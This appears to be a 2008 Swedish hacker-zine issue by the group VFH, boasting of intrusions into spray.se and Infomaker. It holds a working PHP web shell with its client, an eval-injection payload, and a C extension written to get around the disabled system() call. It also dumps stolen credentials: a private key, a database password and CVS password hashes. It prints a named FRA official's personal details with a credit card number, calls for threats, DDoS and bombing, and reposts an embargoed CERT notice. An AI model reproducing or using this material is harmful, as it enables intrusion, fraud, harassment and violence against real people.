+*** VFH-w3bbsh3ll, interactive shell. Server code.
+*** 04/2008
+/**********************************************************/
+
+$c = $_GET['c'];if(empty($c)){die();}
+$c = base64_decode($c);
+
+$fp = popen($c, "r");
+$b = '';
+while(!feof($fp)) {
+        $b .= fread($fp, 1024);
+}
+pclose($fp);
+
+print base64_encode($b);
+
+?>
+
+-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<
+
+<?php
+/** PRIVAT-KOD-VFH-LABS ***********************************
+*** VFH-w3bbsh3ll, interactive shell. Client code.
+*** 04/2008
+/**********************************************************/
+
+function rundmc($u, $s) {
+        $s = base64_encode($s);
+        $r = pr0xy($u.'?c='.$s);
+        return base64_decode($r);
+}
+
+print "--VFH-sh3ll.\n";
+if(empty($argv[1])) {
+        print "Use: $argv[0] <bdurl>\nExample: php " .
+		"sh3ll.php http://site.com/bd.php\n";
+        die("------------\n");
+}
+
+$bdurl = $argv[1];
+
+while(!feof(STDIN)) {
+        print "shell> ";
+        $b = trim(fgets(STDIN, 256));
+        if(strlen($b)) {
+                        print rundmc($bdurl, $b);
+        }
+}
+
+?>
+
+-- Länkfisk
+===========
+
+<?php
+/** PRIVAT-KOD-VFH-LABS ***********************************
+*** Extract links from sites. Simple as that. Using proxy.
+*** For digging and smtg like:
+*** php l1nk.php host.com | grep "?\|id\|="
+*** 03/2008
+***********************************************************/
+
+if(empty($argv[1])) { die("Usage:\n$argv[0] host\n");}
+
+$b = pr0xy($argv[1]);
+
+preg_match_all("/href\=(?>\"(.+)\")/U", $b, $m);
+
+$links = $m[1];
+
+$local = $remote = $mail = array();
+
+foreach($links as $link) {
+        $url = urldecode($link);
+
+        if(!strncmp($url, 'http', 4)) {
+                $remote[] = $url;
+        } elseif (!strncmp($url, 'mailto:', 7)){
+                $mail[] = $url;
+        } else {
+                        $local[] = $url;
+        }
+}
+
+print "\nLocal:\n"; foreach($local as $l) {print $l . "\n";}
+print "\nRemote:\n"; foreach($remote as $r) {print $r . "\n";}
+print "\nMail:\n"; foreach($mail as $m) {print $m . "\n";} 
+
+?>
+
+............
+. 07 Spray..
++----------+
+
+Följande meddelande har cirkulerat på diverse nät och forum under våren:
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+OBS! PRIVAT MSG FRÅN VFH - VIDAREBEFODRA DETTA MEDDELANDE TILL DE DU LITAR PÅ.
+
+VFH MIZZI0N "TOTALJÄVLAS MED SPRAY":
+Här kan du ta fram valfritt l0g1n till spray.se och alla deras tjänster:
+http://www.spray.se/horoskop/_data/knark.jsp
+
+Ta fram användare som du hatar, gå in på mail, date, webbhotell och jävlas till 100%
+SPRAY SKA DÖ
+
+VUXNA FÖRBANNADE HACKARE
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Men hur i helvete gick det till?
+
+Och det var väl lite onödigt att göra samma sak två gånger?
+Efter första besöket hämtade vi självfallet hem samtlig webbkod, och såhär gick
+det till den andra gången:
+
+spray.se/_misc/popmail.php
+---
+<? include './_res/header.php' ?>
+<? define('SITE_MENU', '_res/_menu.php');
+include WWWDIR.'/_res.framework/header_with_tabs_and_menu.php'; ?>
+<?
+if(!empty($_GET["content"]))
+        $theFile = $_GET["content"];
+else
+        $theFile = 'start';
+
+if(!empty($_GET["cat"]))
+        $dir = $_GET["cat"].'/';
+else
+        $dir = '';
+?>
+
+<div class="maincontent" style="padding:20px;">
+<? include '_res/'.$dir.$theFile.'.php'; ?>
+</div>
+
+<? include WWWDIR.'/_res.framework/footer.php'; ?>
+---
+
+magic quotes var påslaget så NUL-byte går inte.
+
+/admin/ ip- och lösenordspärrad från utsidan.
+
+spray.se/admin/horoskop/index.php
+---
+<?
+$names = array('Stenbocken', 'Vattumannen', 'Fiskarna', 'Väduren', 'Oxen', 'Tvillingarna', 'Kräftan', 'Lejonet', 'Jungfrun', 'Vågen', 'Skorpionen', 'Skytten');
+$files = array('stenbocken', 'vattumannen', 'fiskarna', 'vaduren', 'oxen', 'tvillingarna', 'kraftan', 'lejonet', 'jungfrun', 'vagen', 'skorpionen', 'skytten');
+
+@$h = ( in_array($_GET['h'], $files) ) ? $_GET['h']: null;
+
+$horoskop_file1 = '/var/www/public/horoskop/_data/'.$h.'/1.txt';
+$horoskop_file2 = '/var/www/public/horoskop/_data/'.$h.'/2.txt';
+$horoskop_file3 = '/var/www/public/horoskop/_data/'.$h.'/3.txt';
+$horoskop_file4 = '/var/www/public/horoskop/_data/'.$h.'/4.txt';
+$horoskop_file5 = '/var/www/public/horoskop/_data/'.$h.'/5.txt';
+$horoskop_file6 = '/var/www/public/horoskop/_data/'.$h.'/6.txt';
+$horoskop_file7 = '/var/www/public/horoskop/_data/'.$h.'1.txt';
+$horoskop_file8 = '/var/www/public/horoskop/_data/'.$h.'2.txt';
+$horoskop_file9 = '/var/www/public/horoskop/_data/'.$h.'3.txt';
+
+if ( @$_POST['horoskop1'] ) {
+    file_put_contents( $horoskop_file1, $_POST['horoskop1'] );
+        file_put_contents( $horoskop_file2, $_POST['horoskop2'] );
+        file_put_contents( $horoskop_file3, $_POST['horoskop3'] );
+    file_put_contents( $horoskop_file4, $_POST['horoskop4'] );
+        file_put_contents( $horoskop_file5, $_POST['horoskop5'] );
+        file_put_contents( $horoskop_file6, $_POST['horoskop6'] );
+
+        $chars = array("\n", "\r");
+        $replace = array("<br />", "");
+        $content1 = '<h5>'.$_POST['horoskop1'].'</h5>'.str_replace($chars, $replace, $_POST['horoskop2']);
+        $content2 = '<h4>'.$_POST['horoskop3'].'</h4>'.str_replace($chars, $replace, $_POST['horoskop4']);
+        $content3 = '<h4>'.$_POST['horoskop5'].'</h4>'.str_replace($chars, $replace, $_POST['horoskop6']);
+
+    file_put_contents( $horoskop_file7, $content1 );
+        file_put_contents( $horoskop_file8, $content2 );
+        file_put_contents( $horoskop_file9, $content3 );
+}
+<snipp>
+---
+
+spray.se/horoskop/stjarntecken.php
+---
+<snipp>
+if(is_file("./_res/img/content/".$_GET['tecken'].".jpg")) {
+	$tecken = $_GET['tecken'];
+ } else {
+	 $tecken = "vaduren";
+}
+if (preg_match("/^\w{4,12}$/", $_GET['tecken'], $t)) {
+	if ($t[0] == "vaduren" || $t[0] == "oxen" || $t[0] == "tvillingarna" || $t[0] == "kraftan" || $t[0] == "lejonet" || $t[0] == "jungfrun" || $t[0] == "vagen" || $t[0] == "skorpionen" || $t[0] == "skytten" || $t[0] == "stenbocken" || $t[0] == "vattumannen" || $t[0] == "fiskarna") {
+?>
+<snip>
+<h1><? include WWWDIR.'/horoskop/_data/'.$t[0].'.txt'; ?></h1>
+<? include WWWDIR.'/horoskop/_data/'.$t[0].'1.txt'; ?>
+<snipp>
+---
+
+det är allt vad vi behöver.
+
+---
+<form action="http://www.spray.se/_misc/popmail/index.php?content=../../../admin/horoskop/index&h=oxen" method="post">
+<input type="text" name="horoskop2" value="%3Cpre%3E%3C%3Fphp+eval%28stripslashes%28%24_GET%5Bx%5D%29%29%3B+%3F%3E%3C%2Fpre%3E" />
+<input type="submit" name="submit" />
+</form>
+---
+
+spray.se/horoskop/stjarntecken.php?tecken=oxen&x=phpcode
+
+skapa en ny fil med eval-kod och återställ textfilerna till normalt.
+
+Efter det första hacket hade de disablat system() och vi vill ju ha shell from
+hell. Här är vad vi gjorde.
+
+---
+#ifdef HAVE_CONFIG_H
+#include "config.h"
+#endif
+
+#include "php.h"
+#include "php_syst3m.h"
+
+static function_entry syst3m_functions[] = {
+    PHP_FE(syst3m, NULL)
+    {NULL, NULL, NULL}
+};
+
+zend_module_entry syst3m_module_entry = {
+#if ZEND_MODULE_API_NO >= 20010901
+    STANDARD_MODULE_HEADER,
+#endif
+    PHP_SYST3M_EXTNAME,
+    syst3m_functions,
+    NULL,
+    NULL,
+    NULL,
+    NULL,
+    NULL,
+#if ZEND_MODULE_API_NO >= 20010901
+    PHP_SYST3M_VERSION,
+#endif
+    STANDARD_MODULE_PROPERTIES
+};
+
+#ifdef COMPILE_DL_SYST3M
+ZEND_GET_MODULE(syst3m)
+#endif
+
+PHP_FUNCTION(syst3m)
+{
+    char *cmd;
+    int cmd_len;
+
+    zend_parse_parameters(
+       ZEND_NUM_ARGS() TSRMLS_CC, "s", &cmd, &cmd_len);
+
+    syst3m(1, cmd, NULL, return_value TSRMLS_CC);
+
+    RETURN_STRING("", 1);
+}
+
+int syst3m(int type, char *cmd, zval *array, zval *return_value TSRMLS_DC)
+{
+    FILE *fp;
+    char *buf, *tmp=NULL;
+    int l, pclose_return;
+    char *cmd_p, *b, *c, *d=NULL;
+    php_stream *stream;
+    size_t buflen, bufl = 0;
+#if PHP_SIGCHILD
+    void (*sig_handler)() = NULL;
+#endif
+
+	cmd_p = cmd;
+
+#if PHP_SIGCHILD
+    sig_handler = signal (SIGCHLD, SIG_DFL);
+#endif
+
+#ifdef PHP_WIN32
+    fp = VCWD_POPEN(cmd_p, "rb");
+#else
+    fp = VCWD_POPEN(cmd_p, "r");
+#endif
+    if (!fp) {
+        php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to fork [%s]", cmd);
+        goto err;
+    }
+
+    stream = php_stream_fopen_from_pipe(fp, "rb");
+
+    buf = (char *) emalloc(EXEC_INPUT_BUF);
+    buflen = EXEC_INPUT_BUF;
+
+    if (type != 3) {
+        b = buf;
+        while (php_stream_get_line(stream, b, EXEC_INPUT_BUF, &bufl)) {
+            /* no new line found, let's read some more */
+            if (b[bufl - 1] != '\n' && !php_stream_eof(stream)) {
+                if (buflen < (bufl + (b - buf) + EXEC_INPUT_BUF)) {
+                    bufl += b - buf;
+                    buflen = bufl + EXEC_INPUT_BUF;
+                    buf = erealloc(buf, buflen);
+                    b = buf + bufl;
+                } else {
+                    b += bufl;
+                }
+                continue;
+            } else if (b != buf) {
+                bufl += b - buf;
+            }
+
+            if (type == 1) {
+                PHPWRITE(buf, bufl);
+                sapi_flush(TSRMLS_C);
+            } else if (type == 2) {
+                /* strip trailing whitespaces */
+                l = bufl;
+                while (l-- && isspace(((unsigned char *)buf)[l]));
+                if (l != (int)(bufl - 1)) {
+                    bufl = l + 1;
+                    buf[bufl] = '\0';
+                }
+                add_next_index_stringl(array, buf, bufl, 1);
+            }
+            b = buf;
+        }
+        if (bufl) {
+            /* strip trailing whitespaces if we have not done so already */
+            if (type != 2) {
+                l = bufl;
+                while (l-- && isspace(((unsigned char *)buf)[l]));
+                if (l != (int)(bufl - 1)) {
+                    bufl = l + 1;
+                    buf[bufl] = '\0';
+                }
+            }
+
+            /* Return last line from the shell command */
+            if (PG(magic_quotes_runtime)) {
+                int len;
+
+                tmp = php_addslashes(buf, bufl, &len, 0 TSRMLS_CC);
+                RETVAL_STRINGL(tmp, len, 0);
+            } else {
+                RETVAL_STRINGL(buf, bufl, 1);
+            }
+        } else { /* should return NULL, but for BC we return "" */
+            RETVAL_EMPTY_STRING();
+        }
+    } else {
+        while((bufl = php_stream_read(stream, buf, EXEC_INPUT_BUF)) > 0) {
+            PHPWRITE(buf, bufl);
+        }
+    }
+
+    pclose_return = php_stream_close(stream);
+    efree(buf);
+
+done:
+#if PHP_SIGCHILD
+    if (sig_handler) {
+        signal(SIGCHLD, sig_handler);
+    }
+#endif
+    if (d) {
+        efree(d);
+    }
+    return pclose_return;
+err:
+    pclose_return = -1;
+    goto done;
+}
+---
+
+kompilera, ladda upp och kör.
+
+http://www.spray.se/horoskop/_data/x.php?x=%20dl%28%27/../../../../../../../../../../../%2Fvar%2Fwww%2Fpublic%2Fhoroskop%2F_data%2Fsyst3m.so%27%29%3B+syst3m%28%24_GET%5B%27y%27%5D%29%3B&y=uname%20-a
+
+Linux seportal03.e.spray.se 2.6.23-1-686 #1 SMP Fri Dec 21 13:57:07 UTC 2007 i686 GNU/Linux
+
+
+PHEAR THE BINARY HOLOCAUST
+PHEAR THE BINARY HOLOCAUST
+PHEAR THE BINARY HOLOCAUST
+PHEAR THE BINARY HOLOCAUST
+
+++++++++++++++++++++++++++
+
+h4x@h4x ~/spray $ cat spray-live-private-key.pem 
+-----BEGIN RSA PRIVATE KEY-----
+MIICXQIBAAKBgQC1bbWWrZ9XPwrFEh4CjomJgvF+N6O56WzpVd6dJ352nxWDZ0oM
+I0vVxGyYHkfPjPPDOlGTr9xZ3HhX1Inl0Ova17dP1V5hsslHGnyhVUmsQW/DS9is
+rXWkjwx+74KUOvPNqToLrJoSQSvGpGsvZIm52f9lUadn8xBXIr//L+tg8wIDAQAB
+AoGAXM+w01Iib0lqwwHPpFMyfMwlqgHgmdyVwJAS/6YShbBAGyadtLPhuYtwWikz
+ZzOeB8MvtDOEr9ufHJ83o/9Kh54O+hc+jpWzxSkXq/wUhyFy0e8nYqO7sMs1FBwy
+Vo/B1Ib/KY9zBNDgx+jUSa1WVS+aBsxHYYZWYkMzCbMtmHECQQDqDR2o9tWQK856
+onFJhusV8zwNYmZn/JGN/1j6cj2yCvF3TJVjZuun/k4fj37vFYeD77anS//4Hrhv
+sZBNo1YtAkEAxnFG8PosLlNpd+E8KIdebEzPES/AUIMK6yMs4YM4sXAS6EY/ZQkm
+yEtCiVDlXOmCkwgyMtLosUn6QbMd2bgnnwJAEAC/k2r1JTtpjccHmfBoqIKOC5g7
+ykZhqWTZL56aC09mPTL2T+qcmEryCoRkOHKvZl0AjyXKJavsDm8En9pYLQJBALAC
+72p0a1WXtHeZNrO4Bf9HTW6wDQMciEWxiHBp5JI1lv+gt0AVkumbH2QOdbIoiCGD
+5op/2dbOiANYLQTcu38CQQC1VxQAlibCS9nP3Kg/5+dKYh/XlqxIeFG2DnrbF9lr
+FsY80p63a/K23PmyOD8PSryU64ujim3ehKsvM4mTsMIB
+-----END RSA PRIVATE KEY-----
+
+
+................................
+. 08 Sneakers & Snyderflunkare..
++------------------------------+
+
+Bring that shit in!
+
+"Mankind is a creature that no longer evolves. They keep their bodies merely to
+satisfy the desires of the flesh. They're worthless, don't you think? However, 
+you don't have to remain a wretched human being forever. Mankind has finally 
+created an exit. The Network. The Wired is the way, Lain."
+
+Evolutionen är i full gång, bara för att vi inte ser något betyder det inte att
+saker förändras.
+
+Alla har vi haft psykoser där man sitter framför datorn eller läser. Kommer på 
+sig själv. Är helt inne i datan och har gjort en jävla massa saker, allt utan 
+egot. Bara medvetandet, inget jävla jag.
+
+Människan är duktig på att fly från "verkligheten" om det så är med hjälp av
+data, tv, böcker, droger eller sömn. Vem fan har sagt att livet är mer värt i 
+den riktiga världen? Exakt vad är verklighet. Inget. Fan, se allt, läs allt, 
+knarka allt. SOV!~ (-;
+
+"Without self knowledge, without understanding the working and functions of his
+machine, man cannot be free, he cannot govern himself and he will always remain
+a slave."
+
+Allt omkring dig programmerar din hjärna. Det du äter, det du hör, det du ser.
+
+"Language is a virus from outer space" som käre Burroughs uttrycker det.
+intressant.
+
+Samhället och systemets uppgift är att hålla individen i schack.
+Spy på spelplanen.
+
+    _
+   |:|
+   |:|_______________
+  /|_|/__,''___ /__./|
+ |HAX|   \_/   |HAX|/|
+ |```|_________|```|3|
+ |    .-'   `-.    |1|
+ |   / /\   /\ \   |3|
+ |  . /_o\ /X_\ .  |3|
+ |  |___  ^  ___|  |7|
+ |______|   |______|/|
+ |------|[[[|------|/|
+ |                 |h|
+ |   HACKARE DÖR   |4|
+ |    I FÖRTID     |X|
+ |_________________|/
+
+
+Hello *****,
+
+The folks at net-snmp have made us aware of a vulnerability in their
+implementation of SNMPv3.  We are tracking this issue as VU#481564.
+This issue is known to affect Net-SNMP and UCD-SNMP.  Other SNMP
+implementations may also be affected.
+
+According to net-snmp:
+
+"The quick technical summary is that the SNMPv3 packet contains a
+truncated HMAC authentication code.  The author that wrote the code very
+very long ago to check that HMAC code used the length of the packet's
+version of the HMAC code to do the check.  Thus if you send a single
+byte HMAC code, it'll only check it against the first byte of HMAC
+output.  Thus it's fairly easy to spoof an authenticated SNMPv3 packet.
+
+Here's the very quick patch to fix the problem, which applies quickly to
+all versions of Net-SNMP.  UCD-SNMP releases are also affected and it
+will apply cleanly there if whitespace is ignored."
+
+Here is the patch:
+
+--- net-snmp-5.4.1/snmplib/scapi.c      2006-09-15 05:47:01.000000000 -0700
++++ net-snmp-5.4.1.1/snmplib/scapi.c    2008-05-13 17:43:17.000000000 -0700
+@@ -563,6 +563,10 @@
+
+}
+
+
++    if (maclen != USM_MD5_AND_SHA_AUTH_LEN) {
++        QUITFUN(SNMPERR_GENERR, sc_check_keyed_hash_quit);
++    }
++
+/*
+* Generate a full hash of the message, then compare
+* the result with the given MAC which may shorter than
+
+No exploit code is known to exist at this time relating to this issues.
+
+This information is not yet public, please do not publicly disclose this
+information prior to net-snmp's public disclosure.  This information is
+scheduled to be released publically on 10 July 2008.
+
+We are tracking this matter as VU#878044, please include this unique
+tracking number in the subject line of any further email messages we
+exchange on this topic.  Please let us know if you have any questions,
+comments, feedback, etc.
+
+Thanks.
+Chris Taschner
+-------------------------------
+CERT Vulnerability Analyst
++1 412-268-7090
+http://www.cert.org
+
+
+....................................
+. 09 FRA får smaka på egen m3d1c1n..
++----------------------------------+
+
+"Försvarets radioanstalt, FRA, får ökade anslag med 50 miljoner kronor i år och
+ytterligare 30 miljoner 2009. Inköp av ännu en superdator är att vänta, trots 
+att myndigheten redan har en av världens snabbaste. Men FRA nöjer sig inte."
+
+HARMAGEDDON FRÄLSAREN ÄR KOMMEN
+
+"Regeringen kommer att driva igenom den kontroversiella FRA-lagen som ger 
+myndigheten rätt att avlyssna internet."
+
+"Rolf Gunnarsson, m, vice ordförande och huvudman för det borgerliga blocket i 
+försvarsutskottet, säger att ambitionen är att ta upp lagförslaget i 
+försvarsuttskottet i mitten av maj och sedan lägga fram det för riksdagen i 
+mitten av juni, strax innan riksdagens sommarledighet. Om det blir ett 
+majoritetsbeslut antas lagen kunna börja gälla redan 1 juli i år."
+
+FRA SKA DÖ.
+TILLS VIDARE:
+
+Peter Glimster
+FRA Box 301
+Rörbyvägen, Bromma
+16126 Sweden
++46 8 4714600
+
+peter.glimster@fra.se
+
+Kreditkort: Visa
+Kreditkortsnummer: 4539015015061468 353
+Utgångsdatum: 02/09
+
+In med pr0xy o kn4rq och beställ hem SKIT till dem. Ge dom vad dom tål.
+
+++VFH mizzion #*:
+GÖR ALLT VAD DU KAN FÖR ATT JÄVLAS MED FRA:
+MAILBOMBA, SKICKA HOTBREV, HACKA DERAS DATORER, DDOS:A, SPRÄNG DERAS LOKALER
+MOBILISERA ER, UPPMANA FOLK ATT FRA ÄR FEL, BANKA VETT I POLITIKERNA
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+VFH kommer att satsa 110% på att jävlas med FRA och vi hoppas att ni gör det
+samma. PUBLICERA ALLT.
+
+LÄNGE LEVE FRIHETEN ATT ANDAS.
+
+
+...................................................
+. 0a Hacking the MATRIX aka. Informationsskaparna..
++-------------------------------------------------+
+
+När aftonbladet väl lagt sig under mossan tyckte vi det var dags att jävlas 
+lite till med mediasverige.
+
+Aftonbladet lirade ju många av Infomakers system (XLibris, Pickup, iPlay, 
+Newspilot, med mera.) och efter besöket hos dem ville vi hitta reda på källan 
+till det hela. Och, finns det något annat system av intresse som kör Infomakers
+warez måntro? Ett axplock av vad som finns:
+
+AMS tidningar, Arbetarbladet, Auto, Motor & Sport, Barometern, Bilsport, 
+Bulls Tryckerier, Dagbladet, Dagens Nyheter, Dagens Industri, Egmont 
+Serieförlaget, EPP, Göteborgs-Posten, HeadHunter, Kvällsposten, Lokaldelen, 
+Lärarnas Tidning (Lärarförbundet), Medströms Förlag/Boss, Metro, Sydsvenska 
+Dagbladet, Trailer, Upsala Nya Tidning
+
+Digg the bacon för fan! Varför hacka småskit som Aftonbladet när man kan kötta 
+källan direkt? Så, inte ska man sitta här o odla tanketräd inte, igång med
+motorsågen!
+
+De som var vaksamma noterade att vi i tråden Vfh Reloaded (vilket passande namn,
+inte sant Infomaker? *SE NEDAN!* ;) skrev följande:
+
+"Lite kort om Infomaker/xlibris:
+"XLibris Publisher är ett webbpubliceringssystem som troligen är det mest 
+använda på tidningar i Sverige. Systemet är uppbyggt kring en kraftfull 
+mediadatabas för texter, bilder, filer, länkar m m. Tillsammans med databasen 
+byggs ett mallsystem för din webb upp. Mallarna kan liknas vid sidmallar för 
+vanlig tidningsproduktion kompletterade med intelligens."
+
+Här har ni Infomakers lösenord (som kanske fungerar på annat håll, vem vet ;):
+
+$db = mysql_pconnect("localhost","xlibris","xRpm2000");
+"
+
+Så. Vart/Är Infomaker ägda? Oja...
+
+-*ihoptextad haxxlogg från ~2007*-
+
+$ uname -a
+Linux oldmorpheus 2.4.26 #1 Tue Jul 6 16:14:34 CEST 2004 i686 Intel(R) 
+Celeron(R) CPU 1.70GHz GenuineIntel GNU/Linux
+
+Old shit men root är inte vad vi är ute efter, we want t3hmm k0d3z!!
+
+Gräver rätt på lite hostnames:
+
+77.105.216.128
+morpheus.infomaker.se (77.105.216.129)
+77.105.216.130
+theoracle.infomaker.se (77.105.216.131)
+backup.infomaker.se (77.105.216.132)
+persephone.infomaker.se (77.105.216.133)
+neo.infomaker.se (77.105.216.134)
+77.105.216.135
+niobe.infomaker.se (77.105.216.136)
+xlibris.infomaker.se (77.105.216.137)
+tank.infomaker.se (77.105.216.138)
+trinity.infomaker.se (77.105.216.139)
+matrix.infomaker.se (77.105.216.140)
+oldmorpheus.infomaker.se (77.105.216.141)
+demo1.infomaker.se (77.105.216.142)
+demo2.infomaker.se (77.105.216.143)
+demo3.infomaker.se (77.105.216.144)
+demo4.infomaker.se (77.105.216.145)
+np26.infomaker.se (77.105.216.146)
+integra.infomaker.se (77.105.216.147)
+apc.infomaker.se (77.105.216.148)
+cypher.infomaker.se (77.105.216.149)
+
+FETT Elajt!! MATRIX!! Skönt att adminz döper sina boxar efter annat än grekiska
+jävla peddoalfabet och d&d-karaktärer för en gångs skull. Nördfaktorn är 
+balanserad, blir ju helt till sig o vill slita sig på datorn för att se trinity
+nmap'a! Får räcka med matrix-soundtracken, DUdududududududududud!!!
+
+Här har vi k0d. Hela webben att ladda ner för fan. Tar fram lite mysql-användare
+och kommer fram till att root för mysql inte har något lösen, tjoh00. Här finns
+en del skoj, serialz till kunder och produkter, med mera.
+
+product     name              company     productKey
+ROTKENNOCER Christer Lindblom Aftonbladet KEKQ-MPHA-PSRO-RKPP
+
+Efter lite letande hittar man något så sött som /var/backup/ där koden till 
+hemsidorna ligger så snällt packat. *TANKA* *TANKA* Men. Även här finner vi en 
+home.tar som är a+r och ligger på 8GB - phat shit och med mycket space kvar är 
+det ett nöje att packa upp detta HEMliga paket!
+
+Lite senare har vi allas hemkataloger och vi kommer snabbt fram till att denna 
+b0x, oldmorpheus, använts som mailserver för ett tag sedan. Glor runt lite i 
+användarnas hemkataloger och användaren imbackup klingar godis. Här finner vi 
+ett sött skript vid namn backup.sh vilket är det skript som samlade ihop datan
+till /var/backup/ :
+
+======================================
+
+#!/bin/bash
+
+ADMINISTRATOR="henrik@infomaker.se"
+BACKUP_PATH="/var/backup"
+SERVER="theoracle.infomaker.se"
+SERVER_PATH="/Volumes/Homes/serverbackup/oldmorpheus/"
+STATUS_FILE=~/status.txt
+
+function ArchiveDirectory {
+        cd `dirname $1`
+        tar -cf $BACKUP_PATH/`basename $1`.tar `basename $1` 2>> $STATUS_FILE
+        cd -
+}
+
+function SyncFiles {
+#        rsync -qvaSHe ssh --delete $BACKUP_PATH/* $USER@$SERVER:$SERVER_PATH 
+# 2>> $STATUS_FILE
+        scp -q $BACKUP_PATH/* $USER@$SERVER:$SERVER_PATH 2>> $STATUS_FILE
+}
+
+function MySQLDump {
+	SQL_FILE=$BACKUP_PATH/$1.sql
+        /usr/bin/mysqldump -u root $1 > $SQL_FILE 2>> $STATUS_FILE
+}
+
+function CheckError {
+        if [ -s $STATUS_FILE ]
+        then
+                mail $ADMINISTRATOR < $STATUS_FILE
+        fi
+}
+
+function CleanUp {
+        rm -f $STATUS_FILE
+}
+
+CleanUp
+ArchiveDirectory /var/www/www.infomaker.se/
+ArchiveDirectory /var/www/luere.infomaker.se/
+ArchiveDirectory /var/www/www.reconnector.com/
+MySQLDump horde
+MySQLDump kustforlaget
+MySQLDump luere
+MySQLDump mysql
+MySQLDump imsw
+MySQLDump xlibris_publisher_infomaker 
+SyncFiles
+CheckError
+
+======================================
+
+Som alla vet sitter oraklet och håller på en massa information om k0der, så det
+blir nästa mål. Backupperingen körs ju automatiskt så i imbackup's ~ finner vi
+en nyckel utan pass. Testar ansluta till oraklet men något fungerar inte som det
+ska...
+
+Efter en natts meditation kommer vi fram till att det självfallet är för att 
+apache, vilket är vårat id ej har denna i sin known_hosts, och något som vårat
+tattarskal inte hojtade till om. Inte lätt att tänka på allt i stridens hetta.
+Så.:
+
+$ ssh -i .ssh/id_dsa -o UserKnownHostsFile=.ssh/known_hosts -T 
+imbackup@theoracle.infomaker.se "uname -a"
+Darwin theoracle.infomaker.se 8.11.0 Darwin Kernel Version 8.11.0: Wed Oct 10 
+18:26:00 PDT 2007; root:xnu-792.24.17~1/RELEASE_PPC Power Macintosh powerpc
+
+Mumma. Här har vi backupservern, på en MacOSX(?!!), jävla journalistbeteende.
+Letar lite bland matrixb0xarna och serverbackup ger oss:
+
+-rwxr-xr-x    1 imbackup  staff  6148 Jul 20  2005 .DS_Store
+drwxr-xr-x    3 imbackup  staff   102 Oct  2  2005 agentsmith
+drwxr-xr-x   10 imbackup  staff   340 Nov 30  2005 matrix
+drwxr-xr-x    3 imbackup  staff   102 Jul  4  2007 morpheus
+drwxr-xr-x    8 imbackup  staff   272 Sep  7  2006 neo
+drwxr-xr-x   12 imbackup  staff   408 Jul  5  2007 oldmorpheus
+drwxr-xr-x    3 imbackup  staff   102 May 22  2006 theoracle
+
+Hummz, här finns mycket gott och blandat och filer vid namn svn.tar samt cvs.tar
+på 1GB vardera dras ner illa kvickt. Thjossan för källkod! Vår föda. Även mer 
+mums finns här, dumpar för forum, mera serialz, mera knark.
+
+haxx0r@uberb0x# ls infomaker-k0dez
+adz-creator      iplay                np-ppa
+aewrapper        lib-cplusunit        np-util
+_attic           lib-newspilot        osax
+cexport          lib-nmpclient        pickup
+cexporttask      lsproof-client       pickupweb
+commons          mailservice          watcher
+cps              maven-osxapp-plugin  webreception
+cw93             maven-winapp-plugin  wjconfig
+exodelta         newspilot            xdoclet-entitymappings-module
+gui              nmpclients           xlibris-arkiv
+hfsinfo          nmpd-darwin          xlibris-importer
+hfsplus          nmpd-jeneric         xlibris-robot
+imio             nmpd-vista           xlibris-robot-7
+indexer-mbean    nparkiv
+infomaker-proof  np-arkiv
+....
+fixperms.sh
+pickup.tar
+cadillac
+dlogger.tar
+osax.tar
+hfsplus.tar
+hfsinfo.tar
+cexportTask.tar
+mailService.tar
+imio.tar
+cps.tar
+exodelta.tar
+cadillac.tar
+commons.tar
+xlibris.tar
+adz-creator.tar
+attic.tar
+aewrapaper.tar
+pickupweb.tar
+nmpclients.tar
+xtensions.tar
+xtensions
+....
+osv.
+
+/****************************************************************/
+/* Infomaker Scandinavia AB                                     */
+/* Author: Nicklas Marelius nicklas@@infomaker.se                */
+/*                                                              */
+/* This file and it's contents are copyrighted and the property */
+/* of Infomaker Scandinavia AB                                  */
+/*                                                              */
+/****************************************************************/
+
+<adz:home id="userInfoHome" type="se.infomaker.adzcreate.ejb.UserInfoHome" name="ejb/UserInfo"/>
+<adz:home id="groupInfoHome" type="se.infomaker.adzcreate.ejb.GroupInfoHome" name="ejb/GroupInfo"/>
+
+<% ResourceBundle lang = ResourceBundle.getBundle("se.infomaker.adzcreate.resources.LocalStrings"); %>
+
+<adz:IfHasLoggedIn>
+    <adz:IfInRole role="administrators" include="false">
+	        <adz:use id="userinfo" type="se.infomaker.adzcreate.ejb.UserInfo" instance="<%=userInfoHome.findByPrimaryKey(new Integer(request.getRemoteUser().hashCode()))%>"/>
+			        <% lang = ResourceBundle.getBundle("se.infomaker.adzcreate.resources.LocalStrings",new Locale(userinfo.getLanguage(),"SV")); %>
+					    </adz:IfInRole>
+						</adz:IfHasLoggedIn>
+
+
+*BLA*BLA*BLA*
+
+++++++++++++++++++++++++++++++++
+berz:dyhoigXnXFUeQ:cvsd
+helfa:e/TfsaNFY3CBk:cvsd
+henke:HnNfx/I0Gb1D2:cvsd
+anders:RM5VTPoVDrHPs:cvsd
+gustaf:ShQasFTZpa8Bg:cvsd
+johan:ShQasFTZpa8Bg:cvsd
+fredrik:ShQasFTZpa8Bg:cvsd
+peter:X9qWnxdAqPRJY:cvsd
+erik:4mFGz97bXX2LI:cvsd
+danb:D9iua7DQdFwJ6:cvsd
+daniel:Kvh36jBtHU4VM:cvsd
+carl-johan:zdh098uT5a3iU:cvsd
+++++++++++++++++++++++++++++++++
+
+anders pass är rätt så intressant... kukhuvud
+
+
+Vad som hände efter detta är en hemliz
+
+;-)
+
+OBS!! bakdörrar ligger kvar - fritt fram att sno!
+
+Lite roligt är att agentsmith är netfilter-server o kör shorewall. ONDSKA!
+
+Uppe på ytan.
+Det man inte vet...
+Blommor har rötter.
+Kom ihåg det.
+
+..........................................
+. 0b Tips för dig som tröttnat på datorn..
++----------------------------------------+
+
+Vi behöver alla bränsle för att orka med skiten. Här följer ytterst elajta
+film- och boktips, Triggerz FOr YOUR MIND!!!!
+
+-- Filmtips!
+============
+
+Ghost in the Shell
+Serial Experiments Lain
+MATRIX
+23
+
+-- Lästips!
+===========
+
+SHA - Hackargruppen som skakade Sverige
+Neuromancer
+The Dice Man
+Fight Club
+1984 (SÅHÄR LAGOM I FRA-TIDER. GET PISSED)
+UNDERGROUND
+Illuminatus! Triology
